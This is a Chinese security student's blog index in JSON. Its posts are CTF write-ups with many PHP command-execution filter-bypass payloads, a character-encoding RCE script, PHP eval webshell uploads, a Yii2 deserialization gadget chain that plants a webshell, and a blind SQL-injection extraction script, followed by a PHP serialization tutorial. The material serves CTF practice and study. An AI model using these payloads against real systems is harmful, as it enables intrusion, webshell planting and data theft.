{"meta":{"title":"孤独星球","subtitle":"H3h3QAQの博客","description":"本科 | 软件工程 | 网络安全","author":"H3h3QAQ","url":"https://h3h3qaq.github.io","root":"/"},"pages":[{"title":"404","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-10T11:35:46.525Z","comments":true,"path":"404.html","permalink":"https://h3h3qaq.github.io/404.html","excerpt":"","text":""},{"title":"","date":"2021-11-10T11:35:46.649Z","updated":"2021-11-10T11:35:46.649Z","comments":true,"path":"baidu_verify_xxxxxxx.html","permalink":"https://h3h3qaq.github.io/baidu_verify_xxxxxxx.html","excerpt":"","text":"wvlc3L96QK"},{"title":"","date":"2021-11-10T11:35:46.652Z","updated":"2021-11-10T11:35:46.652Z","comments":true,"path":"google1xxxxxxx0.html","permalink":"https://h3h3qaq.github.io/google1xxxxxxx0.html","excerpt":"","text":"google-site-verification: google110e5e5e14c8dcf0.html"},{"title":"放松一下","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-10T11:35:46.541Z","comments":true,"path":"List/index.html","permalink":"https://h3h3qaq.github.io/List/index.html","excerpt":"","text":"影音资源共享"},{"title":"about","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.648Z","comments":true,"path":"about/index.html","permalink":"https://h3h3qaq.github.io/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.649Z","comments":true,"path":"categories/index.html","permalink":"https://h3h3qaq.github.io/categories/index.html","excerpt":"","text":""},{"title":"archives","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.648Z","comments":true,"path":"archives/index.html","permalink":"https://h3h3qaq.github.io/archives/index.html","excerpt":"","text":""},{"title":"留言板","date":"2019-10-24T16:00:00.000Z","updated":"2021-11-10T11:35:46.651Z","comments":true,"path":"contact/index.html","permalink":"https://h3h3qaq.github.io/contact/index.html","excerpt":"","text":"畅所欲言 在这里可以留下你的足迹，欢迎在下方留言，欢迎交换友链，一起交流学习！ 友链 Luckeyの友链信息 博客名称: Luckeyの博客 博客网址: http://www.luckyzmj.cn 博客头像: https://s1.ax1x.com/2020/05/17/YRWsYT.png 博客介绍: The harder you work, the luckier you will be"},{"title":"统计","date":"2020-10-31T02:11:28.000Z","updated":"2021-11-10T11:35:46.650Z","comments":true,"path":"census/index.html","permalink":"https://h3h3qaq.github.io/census/index.html","excerpt":"","text":""},{"title":"友链","date":"2019-07-19T08:42:10.000Z","updated":"2021-11-10T11:35:46.651Z","comments":true,"path":"friends/index.html","permalink":"https://h3h3qaq.github.io/friends/index.html","excerpt":"","text":""},{"title":"资源分享","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-10T11:35:46.652Z","comments":true,"path":"resource/index.html","permalink":"https://h3h3qaq.github.io/resource/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-11-10T13:59:42.424Z","updated":"2021-11-10T13:59:42.424Z","comments":true,"path":"tags/index.html","permalink":"https://h3h3qaq.github.io/tags/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-10T11:35:46.542Z","comments":true,"path":"List/music/index.html","permalink":"https://h3h3qaq.github.io/List/music/index.html","excerpt":"","text":""},{"title":"相册","date":"2021-11-10T11:35:46.532Z","updated":"2021-11-10T11:35:46.532Z","comments":true,"path":"List/galleries/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/index.html","excerpt":"","text":""},{"title":"视频","date":"2019-08-10T08:41:10.000Z","updated":"2021-11-10T11:35:46.542Z","comments":true,"path":"List/movies/index.html","permalink":"https://h3h3qaq.github.io/List/movies/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2021-11-10T11:35:46.543Z","comments":true,"path":"List/tools/index.html","permalink":"https://h3h3qaq.github.io/List/tools/index.html","excerpt":"","text":""},{"title":"乖巧小狗","date":"2021-11-10T11:35:46.533Z","updated":"2021-11-10T11:35:46.533Z","comments":true,"path":"List/galleries/乖巧小狗/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E4%B9%96%E5%B7%A7%E5%B0%8F%E7%8B%97/index.html","excerpt":"","text":""},{"title":"二次元风","date":"2021-11-10T11:35:46.534Z","updated":"2021-11-10T11:35:46.534Z","comments":true,"path":"List/galleries/二次元风/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E4%BA%8C%E6%AC%A1%E5%85%83%E9%A3%8E/index.html","excerpt":"","text":""},{"title":"动漫人物","date":"2021-11-10T11:35:46.535Z","updated":"2021-11-10T11:35:46.535Z","comments":true,"path":"List/galleries/动漫人物/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E4%BA%BA%E7%89%A9/index.html","excerpt":"","text":""},{"title":"动漫插画","date":"2021-11-10T11:35:46.535Z","updated":"2021-11-10T11:35:46.535Z","comments":true,"path":"List/galleries/动漫插画/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/index.html","excerpt":"","text":""},{"title":"动漫风景","date":"2021-11-10T11:35:46.536Z","updated":"2021-11-10T11:35:46.536Z","comments":true,"path":"List/galleries/动漫风景/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""},{"title":"呆萌猫咪","date":"2021-11-10T11:35:46.537Z","updated":"2021-11-10T11:35:46.537Z","comments":true,"path":"List/galleries/呆萌猫咪/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E5%91%86%E8%90%8C%E7%8C%AB%E5%92%AA/index.html","excerpt":"","text":""},{"title":"城市风光","date":"2021-11-10T11:35:46.538Z","updated":"2021-11-10T11:35:46.538Z","comments":true,"path":"List/galleries/城市风光/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E5%9F%8E%E5%B8%82%E9%A3%8E%E5%85%89/index.html","excerpt":"","text":""},{"title":"清新花卉","date":"2021-11-10T11:35:46.538Z","updated":"2021-11-10T11:35:46.538Z","comments":true,"path":"List/galleries/清新花卉/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E6%B8%85%E6%96%B0%E8%8A%B1%E5%8D%89/index.html","excerpt":"","text":""},{"title":"炫酷跑车","date":"2021-11-10T11:35:46.539Z","updated":"2021-11-10T11:35:46.539Z","comments":true,"path":"List/galleries/炫酷跑车/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E7%82%AB%E9%85%B7%E8%B7%91%E8%BD%A6/index.html","excerpt":"","text":""},{"title":"璀璨星空","date":"2021-11-10T11:35:46.540Z","updated":"2021-11-10T11:35:46.540Z","comments":true,"path":"List/galleries/璀璨星空/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/index.html","excerpt":"","text":""},{"title":"甜美食品","date":"2021-11-10T11:35:46.540Z","updated":"2021-11-10T11:35:46.540Z","comments":true,"path":"List/galleries/甜美食品/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E7%94%9C%E7%BE%8E%E9%A3%9F%E5%93%81/index.html","excerpt":"","text":""},{"title":"自然风景","date":"2021-11-10T11:35:46.541Z","updated":"2021-11-10T11:35:46.541Z","comments":true,"path":"List/galleries/自然风景/index.html","permalink":"https://h3h3qaq.github.io/List/galleries/%E8%87%AA%E7%84%B6%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""}],"posts":[{"title":"CTFSHOW命令执行","slug":"CTFshow命令执行wp","date":"2021-11-11T03:35:22.000Z","updated":"2021-11-11T02:38:31.443Z","comments":true,"path":"posts/62244cdb.html","link":"","permalink":"https://h3h3qaq.github.io/posts/62244cdb.html","excerpt":"","text":"CTFSHOW命令执行web29过滤了flag payload： 随便写几个姿势 /?c=system(\"nl fl??????\"); /?c=system(\"nl fl*\"); /?c=system(\"nl fla''g.php\"); /?c=echo `nl fla\"\"g.php`; /?c=echo `nl fla\\g.php`; /?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php /?c=eval($_GET[1]);&amp;1=system('nl flag.php'); 剩下的我不会了 ##web30 过滤了flag|system|php 用echo 反引号来执行命令 payload： /?c=echo `nl fla\"\"g.p\"\"hp`; /?c=echo `nl fla?????`; /?c=echo `nl f*`; /?c=eval($_GET[1]);&amp;1=system('nl flag.php'); /?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php web31过滤了flag|system|php|cat|sort|shell|\\.| | 没关系，我们有都是姿势 payload： /?c=highlight_file(next(array_reverse(scandir(dirname(__FILE__))))); /?c=include($_GET[1]);&amp;1=php://filter/read=convert.base64-encode/resource=flag.php /?c=show_source(next(array_reverse(scandir(pos(localeconv()))))); ##web32 include不用括号，分号可以用?&gt;代替。 payload： /?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php /?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt; /?c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg== web33-36payload： /?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php /?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(\"cat flag.php\");?&gt; /?c=include$_GET[1]?&gt;&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg== web37&lt;?php //flag in flag.php error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag/i\", $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); } payload： /?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== /?c=data://text/palin,&lt;?php system(\"nl fla*\");?&gt; web38过滤了flag payload： /?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== web39payload： /?c=data://text/palin,&lt;?php%20system(\"nl%20f*\");?&gt; web40理论上是异或 然后我懒 贴exp： import re content = '' preg = '/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&amp;|\\-/' for i in range(256): for j in range(256): if not (re.match(preg,chr(i),re.I) or re.match(preg,chr(j),re.I)): k = i | j if k&gt;=32 and k&lt;=126: a = '%' + hex(i)[2:].zfill(2) b = '%' + hex(j)[2:].zfill(2) content += (chr(k) + ' '+ a + ' ' + b + '\\n') f = open('rce_or.txt', 'w') f.write(content) # -*- coding: utf-8 -*- import requests import urllib from sys import * import os os.system(\"php rce_or.php\") #没有将php写入环境变量需手动运行 if(len(argv)!=2): print(\"=\"*50) print('USER：python exp.py &lt;url&gt;') print(\"eg： python exp.py http://ctf.show/\") print(\"=\"*50) exit(0) url=argv[1] def action(arg): s1=\"\" s2=\"\" for i in arg: f=open(\"rce_or.txt\",\"r\") while True: t=f.readline() if t==\"\": break if t[0]==i: #print(i) s1+=t[2:5] s2+=t[6:9] break f.close() output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\" return(output) while True: param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\")) data={ 'c':urllib.parse.unquote(param) } r=requests.post(url,data=data) print(\"\\n[*] result:\\n\"+r.text) exp取自https://wp.ctf.show/d/137-ctfshow-web-web41/4 web41payload: /?c=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); web42/dev/null 2&gt;&amp;1，让所有的输出流（包括错误的和正确的）都定向到空设备丢弃 %0a、%26、||截断 payload： /?c=nl%20*%0a = =姿势就不写那么多了 截断后看过滤自由发挥 web43过滤了;|cat payload： /?c=nl%20*%0a web44多过滤了个flag 通配符搞定 payload： /?c=nl%20*%0a web45空格被过滤了 payload： /?c=nl$IFS*%0a web46-49过滤了\\;|cat|flag| |[0-9]|\\\\$|\\*/ payload： /?c=nl%09fla\\g.php|| /?c=nl%09fla\\g.php%0a /?c=nl%09fla''g.php%0a /?c=nl%09fla\"\"g.php%0a /?c=vi%09fla\\g.php%0a /?c=tac%09fla\\g.php%0a /?c=uniq%09fla\\g.php%0a /?c=nl&lt;fla''g.php|| /?c=nl%09fla\\g.php%26 web50-51payload： /?c=nl&lt;fla%27%27g.php|| web52payload： /?c=nl${IFS}/fl\"\"ag%0a web53payload： /?c=nl${IFS}fla%''g.p''hp /?c=ca''t${IFS}fl?????? /?c=ca''t${IFS}fl''ag.p''hp 应该还有其他姿势 web54payload： /?c=mv${IFS}fla?.php${IFS}t.tx''t 爷给他改个名 /?c=/bin/?at${IFS}f??????? web55= = 只能是数字 对不起骚套路开始 payload： /?c=/???/????64+????.??? web56 https://blog.csdn.net/qq_46091464/article/details/108513145 数据包： POST /?c=.+/???/????????[@-[] HTTP/1.1 Host: 6595d4e2-edc5-4ff4-a08b-c93d2f563732.challenge.ctf.show:8080 Content-Length: 329 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydZeuVbMPZVcyvpNM User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ------WebKitFormBoundarydZeuVbMPZVcyvpNM Content-Disposition: form-data; name=\"file\"; filename=\"2.php\" Content-Type: application/octet-stream #!/bin/sh cat /var/www/html/flag.php ------WebKitFormBoundarydZeuVbMPZVcyvpNM Content-Disposition: form-data; name=\"submit\" 111 ------WebKitFormBoundarydZeuVbMPZVcyvpNM-- ##web58 凑36 -37取反=36 payload： $((~$(($((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_}))))$((~$((${_})))))))) ##web59 绕过disable_functions 我只想到一种 file可以把文件读取到一个数组，再打印出来 payload： c=var_dump(file('flag.php')); c=highlight_file(\"flag.php\"); c=show_source('flag.php'); ##web60-65 payload： c=highlight_file(\"flag.php\"); c=show_source('flag.php'); web66payload： c=var_dump(scandir(\"/\")); 扫描到flag 是txt 然后日他妈的 c=highlight_file('/flag.txt'); web67-70= = 好家伙 ban的真多 payload： c=include('/flag.txt'); c=require('/flag.txt'); c=require_once('/flag.txt'); web71ob_get_contents — 返回输出缓冲区的内容 ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲 此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()**之前调用ob_get_contents()，因为当调用ob_end_clean()**时缓冲区内容将被丢弃。 https://blog.csdn.net/solitudi/article/details/109837640?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163062881716780269897928%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163062881716780269897928&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-109837640.first_rank_v2_pc_rank_v29&amp;utm_term=y4tacker+%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;spm=1018.2226.3001.4187 y4的blog说的很清楚 payload： c=include('/flag.txt');;exit(); web72 看一下y4的blog就可以了= = payload不贴了 太长了。 ##web73 c=?&gt;&lt;?php $a=new DirectoryIterator(\"glob:///*\"); foreach($a as $f) {echo($f-&gt;__toString().' '); } exit(0); ?&gt; 看一下目录 然后 payload： c=include('/flagc.txt');exit(); web74同73题 web75-76扫目录 c=$a=new DirectoryIterator(\"glob:///*\");foreach($a as $f){echo($f-&gt;__toString().' ');}exit(0); mysql load_file读文件 c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root', 'root');foreach($dbh-&gt;query('select load_file(\"/flag36.txt\")') as $row) {echo($row[0]).\"|\"; }$dbh = null;}catch (PDOException $e) {echo $e- &gt;getMessage();exit(0);}exit(0); ##web77 不是很清楚这个题怎么做 但是我复现了一下 https://www.laruence.com/2020/03/11/5475.html https://blog.csdn.net/miuzzx/article/details/108619930","categories":[],"tags":[{"name":"做题记录","slug":"做题记录","permalink":"https://h3h3qaq.github.io/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"CTFHub 2021-第四届红帽杯网络安全大赛-Web-find_it","slug":"[CTFHub] 2021-第四届红帽杯网络安全大赛-Web-find_it","date":"2021-11-11T03:35:22.000Z","updated":"2021-11-11T02:44:33.558Z","comments":true,"path":"posts/ce4e97fc.html","link":"","permalink":"https://h3h3qaq.github.io/posts/ce4e97fc.html","excerpt":"","text":"[CTFHub] 2021-第四届红帽杯网络安全大赛-Web-find_it看群里说CTFHub上复现了， 我来看看 本来想按照红帽杯的套路来试一下，发现phpinfo里莫得flag了 只能想想其他办法咯 &lt;?php #Really easy... $file=fopen(\"flag.php\",\"r\") or die(\"Unable 2 open!\"); $I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(\"flag.php\")); $hack=fopen(\"hack.php\",\"w\") or die(\"Unable 2 open\"); $a=$_GET['code']; if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/',$a)){ die(\"you die\"); } if(strlen($a)&gt;33){ die(\"nonono.\"); } fwrite($hack,$a); fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh); fclose($file); fclose($hack); ?&gt; preg_match()过滤了eval但是！！！！！ Eval它没ban 所以我们可以写’大’马 构造payload： /?code=&lt;?php%20@Eval($_POST['aaa']);?&gt; 蚁剑连马 拿到flag： 但是作为菜鸡 我还是要重新思考一下这道题的思路： 代码中有几个函数需要注意一下 比如fopen(),fwrite(),fread() fread() 函数读取文件 $I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(\"flag.php\")); 也就是说，这里已经读到了flag $a=$_GET['code']; fwrite($hack,$a); fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh); 这里又都写到了hack.php 所以也就是说，我们再绕通配符写马的时候，flag也被传进了hack.php中 但是为什么看不到呢（具体我也不知道，知道的大哥哥可以告诉我学习一下） 但是我想到了另外一个函数show_source() show_source() 函数对文件进行语法高亮显示。 随机构造payload： /?code=&lt;?php show_source(__FILE__);?&gt; 也没有被ban的项，正常传入 然后访问hack.php flag他就出来了。。。。 同时还有我传入的payload 搞一波骚操作！ 所以，今天又学到了新姿势~~~~","categories":[],"tags":[{"name":"做题记录","slug":"做题记录","permalink":"https://h3h3qaq.github.io/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"2021红帽杯 web writeup","slug":"[2021红帽杯]Web writeup","date":"2021-11-11T03:35:22.000Z","updated":"2021-11-11T02:44:27.496Z","comments":true,"path":"posts/fa671b36.html","link":"","permalink":"https://h3h3qaq.github.io/posts/fa671b36.html","excerpt":"","text":"find_it老套路扫一下目录 貌似只有君子协定有用，打开看看 When I was a child,I also like to read Robots.txt Here is what you want:1ndexx.php 打开1ndexx.php 发现打不开， 尝试一下是否有备份 /.1ndexx.php.swp 发现了一串代码： &lt;?php $link = mysql_connect('localhost', 'root'); ?&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Hello worldd!&lt;/title&gt; &lt;style&gt; body { background-color: white; text-align: center; padding: 50px; font-family: \"Open Sans\",\"Helvetica Neue\",Helvetica,Arial,sans-serif; } #logo { margin-bottom: 40px; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;img id=\"logo\" src=\"logo.png\" /&gt; &lt;h1&gt;&lt;?php echo \"Hello My freind!\"; ?&gt;&lt;/h1&gt; &lt;?php if($link) { ?&gt; &lt;h2&gt;I Can't view my php files?!&lt;/h2&gt; &lt;?php } else { ?&gt; &lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt; &lt;?php } ?&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php #Really easy... $file=fopen(\"flag.php\",\"r\") or die(\"Unable 2 open!\"); $I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(\"flag.php\")); $hack=fopen(\"hack.php\",\"w\") or die(\"Unable 2 open\"); $a=$_GET['code']; if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/',$a)){ die(\"you die\"); } if(strlen($a)&gt;33){ die(\"nonono.\"); } fwrite($hack,$a); fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh); fclose($file); fclose($hack); ?&gt; 构造payload： /?code=&lt;?php%20phpinfo();?&gt; 然后访问一下hack.php查看phpinfo 本来只是想指向探针看一下，没想到flag直接给了 framework打开发现是yii2反序列化 随即打开百度，来找一下复现： https://mp.weixin.qq.com/s?__biz=MzU5MDI0ODI5MQ==&amp;mid=2247485129&amp;idx=1&amp;sn=b27e3fe845daee2fb13bb9f36f53ab40 然后回到题目，按照常理我扫了一下网站目录，发现了www.zip“ ： 下载到本地发现正好是源码，就在本地搭建环境 丢进去phpstudy里，按照大佬的漏洞复现，在controllers下创建Controller.php 然后再新建个poc.php 在里面写： &lt;?php namespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'assert'; $this-&gt;id = 'file_put_contents(\"/var/www/html/web/1.php\",\"&lt;?php eval(\\$_POST[111]);\");'; } } } namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['close'] = [new CreateAction(), 'run']; } } } namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-&gt;_dataReader = new Generator; } } } namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult)); } ?&gt; 然后再生成一下payload 传进去： /index.php?r=site/about&amp;message=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjczOiJmaWxlX3B1dF9jb250ZW50cygiL3Zhci93d3cvaHRtbC93ZWIvMS5waHAiLCI8P3BocCBldmFsKFwkX1BPU1RbMTExXSk7Iik7Ijt9aToxO3M6MzoicnVuIjt9fX19 一开始，传进去看到这个报错，以为没有成功，后来访问了一下1.php发现自己成功了QAQ 打开蚁剑，直接连上马： 看了一圈发现flag再根目录： 然后发现没有权限。。。。。。。又卡住了 但是我做题晚上刚刚复现了蓝帽的web题，有disable_functions绕过插件，就去试了一下 然后试着读了一下 它就出来了！！！！！！！ #WebsiteManger 是一道注入题 跑了一下sqlmap 发现了两个参数： username password 和/image.php下的id 注入了一下发现前两个都不是，随即对id下手 尝试了几种注入都无效，最后发现是异或注入 构造payload： /image.php?id=1^(ascii(substr((select(database())),1,1))&gt;1)^1 有回现，尝试变更参数 直到： /image.php?id=1^(ascii(substr((select(database())),1,1))&gt;99)^1 时没有回显，证明数据库第一位是c 获取第二位： /image.php?id=1^(ascii(substr((select(database())),2,1))&gt;1)^1 发现到117没有回显 证明第二位为t 依次类推，获得第三位为f 当数据库位数为4位时始终没有回显。证明只有三位，且数据库名为ctf 知道了数据库名就好办了，直接起脚本，依次爆）： import requests import time url = \"http://eci-2zefme7yqvztqdsonszy.cloudeci1.ichunqiu.com/image.php?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='ctf')),{0},1))&gt;{1})^1\" word=\"\" for i in range(1,1000): l = 32 h = 128 mid = (l + h) while (l &lt; h): nurl=url.format(i,mid) r=requests.get(url=nurl) if 'JFIF' in r.text: l = mid + 1 else: h = mid mid = (l + h) // 2 time.sleep(0.1) word += chr(mid) print(word) print(word) 获得表名为 users 之后依次修改url 继续 爆破 最终爆破出来密码为（当前环境下的密码）： 然后登录管理员账号： 抓包查看发现是ssrf 读取文件漏洞 构造payload： file:// /flag 获得flag #hpcurve 是一道原题 原题地址：https://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/ ebcdic编码转换成ascii编码 使用DD命令去操作，Linux命令 得到flag","categories":[],"tags":[{"name":"做题记录","slug":"做题记录","permalink":"https://h3h3qaq.github.io/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"PHP反序列化漏洞基础","slug":"PHP反序列化漏洞基础","date":"2021-11-10T13:35:22.000Z","updated":"2021-11-11T02:31:30.274Z","comments":true,"path":"posts/ae3250a1.html","link":"","permalink":"https://h3h3qaq.github.io/posts/ae3250a1.html","excerpt":"","text":"PHP序列化与序列化作者：H3h3QAQ 一、PHP序列化和反序列化1.PHP反序列化：serialize() 将变量或者对象转换成字符串的过程，用于存储或传递PHP的值的过程种，同时不丢失其类型和结构 常见的序列化字母表示及其含义： a - array -----&gt;a:&lt;n&gt;:{&lt;key 1&gt;&lt;value 1&gt;...&lt;key n&gt;&lt;value n&gt;} b - boolean -----&gt;b:&lt;digit&gt; d - double -----&gt;d:&lt;number&gt; i - integer -----&gt;i:&lt;number&gt; o - common r - reference s - string -----&gt;s:&lt;length&gt;:\"&lt;value&gt;\" C - custom object O - class -----&gt;O:&lt;length&gt;:\"&lt;class name&gt;\":&lt;n&gt;:{&lt;field name 1&gt;&lt;field value1&gt;...&lt;field name n&gt;&lt;field value n&gt;} N - null R - pointer reference U - unicode string &lt;?php class h3{ public $v1; public $v2=false; public $v3=1; public $v4=2.1; public $v5=array(); public $v6=\"h3h3QAQ\"; private $v7=\"H3h3QAQ\"; protected $v8=\"protected\"; } $s=serialize(new h3()); echo $s; var_dump(unserialize($s)); 序列化运行结果为： O:2:\"h3\":8:{s:2:\"v1\";N;s:2:\"v2\";b:0;s:2:\"v3\";i:1;s:2:\"v4\";d:2.1;s:2:\"v5\";a:0:{}s:2:\"v6\";s:7:\"h3h3QAQ\";s:6:\" h3 v7\";s:7:\"H3h3QAQ\";s:5:\" * v8\";s:9:\"protected\";} 反序列化运行结果 object(h3)#1 (8) { [\"v1\"]=&gt; NULL [\"v2\"]=&gt; bool(false) [\"v3\"]=&gt; int(1) [\"v4\"]=&gt; float(2.1) [\"v5\"]=&gt; array(0) { } [\"v6\"]=&gt; string(7) \"h3h3QAQ\" [\"v7\":\"h3\":private]=&gt; string(7) \"H3h3QAQ\" [\"v8\":protected]=&gt; string(9) \"protected\" } （1）各种魔术方法__destruct()：//析构函数当对象被销毁时会被自动调用 __wakeup(): //unserialize()时会被自动调用 __invoke(): //当尝试以调用函数的方法调用一个对象时，会被自动调用 __call(): //在对象上下文中调用不可访问的方法时触发 __callStatci(): //在静态上下文中调用不可访问的方法时触发 __get(): //用于从不可访问的属性读取数据 __set(): //用于将数据写入不可访问的属性 __isset(): //在不可访问的属性上调用isset()或empty()触发 __unset(): //在不可访问的属性上使用unset()时触发 __toString(): //把类当作字符串使用时触发 __construct(): //构造函数，当对象new的时候会自动调用，但在unserialize()时不会自动调用 __sleep(): //serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用 当PHP5&lt;5.6.25、PHP7&lt;7.0.1时，当成员属性数目大于实际数码时可绕过__wakeup方法（CVE-2016-7124） （2）PHP反序列化特性1.PHP在反序列化时，底层代码时以;作为字段的分隔，以}作为结尾（字符串除外），并且是根据长度判断内容的。 2.在反序列的时候php会根据s所指定的字符长度去读取后面的字符。如果指定的长度错误则反序列化就会失败。 3.对类中不存在的属性也会进行反序列化。 2.session反序列化（1）session概念PHP session时一个特殊的变量，用于存储有关用户会话的信息，或更改用户会话的设置。session变量保存的信息是单一用户的，并且可供应用程序中的所有界面使用。它每个访问或者创建都有唯一的id（UID），并基于这个UID来储存变量。UID储存在cookie中，或者通过URL来进行传导。 （2）会话过程当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果请求中不包括会话ID信息，PHP就会创建一个新的会话。会话开始之后，PHP就会将会话中的数据设置到$_SESSION变量中。当PHP停止的时候，它会自动读取$_SESSION中的内容，并将其进行序列化，然后发送会话保存管理器来进行保存。 默认情况下，PHP使用内置的文件会话保存管理器（files）来完成会话的保存。可以通过调用函数session_start()来手动开始一个会话。如果配置项session.auto_start设置为1，那么请求开始的时候，会话会自动开始 PHP脚本执行完毕之后，会话会自动关闭。同时，也可以通过调用函数session_write_close()来手动关闭会话 